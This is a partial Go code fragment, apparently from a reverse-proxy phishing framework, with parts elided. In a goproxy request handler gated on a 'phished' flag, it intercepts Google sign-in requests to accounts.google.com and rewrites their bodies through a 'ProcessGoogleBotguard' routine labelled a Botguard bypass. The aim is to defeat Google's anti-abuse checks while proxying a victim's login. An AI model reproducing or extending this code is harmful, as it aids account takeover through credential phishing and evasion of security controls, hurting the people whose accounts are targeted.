	...
	p.Proxy.OnRequest().
		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
			...
			if phished {
				...
				if pl != nil && strings.EqualFold(req.Host, "accounts.google.com") && 
				   strings.Contains(req.URL.Path, "/v3/signin/_/AccountsSignInUi/data/batchexecute") &&
				   strings.Contains(req.URL.RawQuery, "rpcids=V1UmUe") {
					
					log.Debug("Botguard bypass triggered for: %s", req.URL.String())
					...
					if len(bodyBytes) > 0 {
						...
						if err == nil {
							// Process with your bypass handler
							modifiedBody := ProcessGoogleBotguard(req, []byte(decodedBody))
							if modifiedBody != nil && len(modifiedBody) > 0 {
								// Re-encode and replace
								bodyBytes = modifiedBody
								req.Body = ioutil.NopCloser(bytes.NewBuffer(bodyBytes))
								req.ContentLength = int64(len(bodyBytes))
								log.Debug("Botguard bypass: Request body modified successfully")
							}
						} else {
							log.Debug("Botguard bypass: Failed to decode body: %v", err)
						}
					}
				}
				// ========== END BOTGUARD BYPASS ==========
